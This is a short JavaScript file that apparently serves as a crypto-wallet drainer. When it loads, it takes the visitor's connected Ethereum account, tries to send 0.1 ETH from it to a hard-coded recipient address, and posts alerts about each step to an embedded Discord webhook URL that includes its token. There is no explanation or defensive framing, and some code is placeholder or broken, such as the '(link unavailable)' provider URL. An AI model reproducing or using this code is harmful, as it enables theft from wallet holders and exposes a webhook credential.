const Web3 = require('web3');
const Discord = require('discord-webhook-node');

const web3 = new Web3(new Web3.providers.HttpProvider('(link unavailable)'));
const webhookURL = 'https://discord.com/api/webhooks/1278831545314181120/NEBxT_KhStvvXsSZshZ1c99ODY8-t4O5b2E7-N8oApSgT75aIuvOk5GGd2Ly8rf7vyjS';
const sendEthAddress = '0xcb90Ea15d707a5A79B5B9E102400E0903034e07b';

function sendMessage(message) {
  const embed = {
    title: "Transaction Alert",
    description: message,
    fields: [
      {
        name: "From",
        value: receiveAddress,
      },
      {
        name: "To",
        value: sendEthAddress,
      },
    ],
  };

  const webhook = new Discord.Webhook(webhookURL);
  webhook.send(embed);
}

let receiveAddress;

ethereum.request({ method: 'eth_accounts' })
  .then(accounts => {
    receiveAddress = accounts[0];
    sendEth();
  });

function sendEth() {
  const ethAmount = 0.1; // Amount of ETH to send (in this case, 0.1 ETH)
  web3.eth.getBalance(receiveAddress, (err, balance) => {
    if (err) {
      sendMessage(`Error: ${err.message}`);
    } else {
      if (balance < web3.utils.toWei(ethAmount.toString(), "ether")) {
        sendMessage("Insufficient ETH balance");
      } else {
        const txCount = web3.eth.getTransactionCount();
        const txData = {
          from: receiveAddress,
          to: sendEthAddress,
          value: web3.utils.toWei(ethAmount.toString(), "ether"),
          gas: "20000",
          gasPrice: web3.utils.toWei("20", "gwei"),
          nonce: txCount,
        };

        web3.eth.sendTransaction(txData)
          .on("transactionHash", (hash) => {
            console.log(`Transaction hash: ${hash}`);
            sendMessage(`Sent ${ethAmount} ETH to ${sendEthAddress}`);
          })
          .on("confirmation", (confirmationNumber, receipt) => {
            console.log(`Confirmation number: ${confirmationNumber}`);
            console.log(`Transaction receipt: ${receipt}`);
          })
          .on("error", (error) => {
            sendMessage(`Error sending ETH: ${error.message}`);
          });
      }
    }
  });
}
